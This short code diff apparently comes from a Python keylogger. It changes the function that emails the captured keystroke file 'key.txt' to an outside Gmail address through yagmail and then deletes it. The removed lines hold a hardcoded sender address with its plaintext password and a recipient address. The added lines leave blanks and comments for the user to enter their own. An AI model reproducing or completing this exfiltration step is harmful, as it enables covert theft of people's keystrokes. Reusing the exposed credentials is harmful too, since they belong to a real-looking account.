@@ -17,8 +17,8 @@ def delete():
 	except:
 		print("no file was deleted")
 def sends():
-	yag=yagmail.SMTP(user="forgithub91@gmail.com",password="Gourav@9158")
-	yag.send(to='gouravsuram91@gmail.com', contents='Hello biro',attachments="key.txt")
+	yag=yagmail.SMTP(user='',password='') #enter your gmail id and password here
+	yag.send(to='', contents='Keylogger',attachments="key.txt") #enter the gmail id you want to send the key.txt file to
 	delete()
 
 
